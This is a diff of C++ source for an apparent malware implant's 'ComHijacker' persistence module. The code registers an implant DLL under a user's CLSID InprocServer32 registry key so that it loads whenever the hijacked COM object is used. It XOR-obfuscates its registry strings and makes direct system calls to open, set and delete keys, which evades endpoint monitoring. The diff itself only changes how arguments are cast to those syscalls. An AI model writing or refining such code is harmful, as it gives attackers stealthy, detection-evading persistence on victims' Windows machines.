@@ -11,7 +11,7 @@ namespace persistence {
 
 namespace {
     // XOR strings (key 0x5A)
-    const wchar_t kClsidPathEnc[] = { 'S'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, 'w'^0x5A, 'a'^0x5A, 'r'^0x5A, 'e'^0x5A, '\\'^0x5A, 'C'^0x5A, 'l'^0x5A, 'a'^0x5A, 's'^0x5A, 's'^0x5A, 'e'^0x5A, 's'^0x5A, '\\'^0x5A, 'C'^0x5A, 'L'^0x5A, 'S'^0x5A, 'I'^0x5A, 'D'^0x5A, '\\'^0x5A }; // Software\Classes\CLSID\
+    const wchar_t kClsidPathEnc[] = { 'S'^0x5A, 'o'^0x5A, 'f'^0x5A, 't'^0x5A, 'w'^0x5A, 'a'^0x5A, 'r'^0x5A, 'e'^0x5A, '\\'^0x5A, 'C'^0x5A, 'l'^0x5A, 'a'^0x5A, 's'^0x5A, 's'^0x5A, 'e'^0x5A, 's'^0x5A, '\\'^0x5A, 'C'^0x5A, 'L'^0x5A, 'S'^0x5A, 'I'^0x5A, 'D'^0x5A, '\\'^0x5A }; // Software-Classes-CLSID
     const wchar_t kInprocEnc[] = { 'I'^0x5A, 'n'^0x5A, 'p'^0x5A, 'r'^0x5A, 'o'^0x5A, 'c'^0x5A, 'S'^0x5A, 'e'^0x5A, 'r'^0x5A, 'v'^0x5A, 'e'^0x5A, 'r'^0x5A, '3'^0x5A, '2'^0x5A }; // InprocServer32
     const wchar_t kThreadingModelEnc[] = { 'T'^0x5A, 'h'^0x5A, 'r'^0x5A, 'e'^0x5A, 'a'^0x5A, 'd'^0x5A, 'i'^0x5A, 'n'^0x5A, 'g'^0x5A, 'M'^0x5A, 'o'^0x5A, 'd'^0x5A, 'e'^0x5A, 'l'^0x5A }; // ThreadingModel
     const wchar_t kBothEnc[] = { 'B'^0x5A, 'o'^0x5A, 't'^0x5A, 'h'^0x5A }; // Both
@@ -40,7 +40,7 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     HANDLE hHkcu = NULL;
-    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hHkcu, (UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
 
     if (!NT_SUCCESS(status)) return false;
 
@@ -48,11 +48,11 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
     HANDLE hKey = NULL;
     status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
 
-    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    InternalDoSyscall(ntCloseSsn, (UINT_PTR)hHkcu, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
 
     if (NT_SUCCESS(status)) {
         UNICODE_STRING uEmpty = {0, 0, NULL};
-        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
+        InternalDoSyscall(ntSetValueKeySsn, (UINT_PTR)hKey, (UINT_PTR)&uEmpty, 0, (UINT_PTR)REG_SZ, (UINT_PTR)implantPath.c_str(), (UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);
 
         std::wstring tm = utils::DecryptW(kThreadingModelEnc, 14);
         UNICODE_STRING uTm;
@@ -61,9 +61,9 @@ bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& c
         uTm.MaximumLength = uTm.Length + sizeof(wchar_t);
 
         std::wstring tmVal = utils::DecryptW(kBothEnc, 4);
-        InternalDoSyscall(ntSetValueKeySsn, hKey, &uTm, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)tmVal.c_str(), (PVOID)(UINT_PTR)((tmVal.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
+        InternalDoSyscall(ntSetValueKeySsn, (UINT_PTR)hKey, (UINT_PTR)&uTm, 0, (UINT_PTR)REG_SZ, (UINT_PTR)tmVal.c_str(), (UINT_PTR)((tmVal.length() + 1) * sizeof(wchar_t)), 0, 0, 0, 0, 0);
 
-        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        InternalDoSyscall(ntCloseSsn, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         return true;
     }
 
@@ -89,9 +89,9 @@ bool ComHijacker::Verify(const std::wstring& clsid) {
     InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
     HANDLE hKey = NULL;
-    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_READ, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hKey, (UINT_PTR)KEY_READ, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
     if (NT_SUCCESS(status)) {
-        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        InternalDoSyscall(ntCloseSsn, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         return true;
     }
     return false;
@@ -112,7 +112,7 @@ bool ComHijacker::Uninstall(const std::wstring& clsid) {
     OBJECT_ATTRIBUTES objAttr;
     InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
     HANDLE hKey = NULL;
-    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hKey, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&objAttr, 0, 0, 0, 0, 0, 0, 0, 0);
     if (NT_SUCCESS(status)) {
         std::wstring subPath = fullPath + L"\\" + utils::DecryptW(kInprocEnc, 14);
         UNICODE_STRING uSubPath;
@@ -122,12 +122,12 @@ bool ComHijacker::Uninstall(const std::wstring& clsid) {
         OBJECT_ATTRIBUTES subAttr;
         InitializeObjectAttributes(&subAttr, &uSubPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
         HANDLE hSubKey = NULL;
-        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hSubKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &subAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
-            InternalDoSyscall(ntDeleteKeySsn, hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-            InternalDoSyscall(ntCloseSsn, hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, (UINT_PTR)&hSubKey, (UINT_PTR)KEY_ALL_ACCESS, (UINT_PTR)&subAttr, 0, 0, 0, 0, 0, 0, 0, 0))) {
+            InternalDoSyscall(ntDeleteKeySsn, (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+            InternalDoSyscall(ntCloseSsn, (UINT_PTR)hSubKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
         }
-        status = InternalDoSyscall(ntDeleteKeySsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+        status = InternalDoSyscall(ntDeleteKeySsn, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
+        InternalDoSyscall(ntCloseSsn, (UINT_PTR)hKey, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
     }
     return NT_SUCCESS(status);
 }
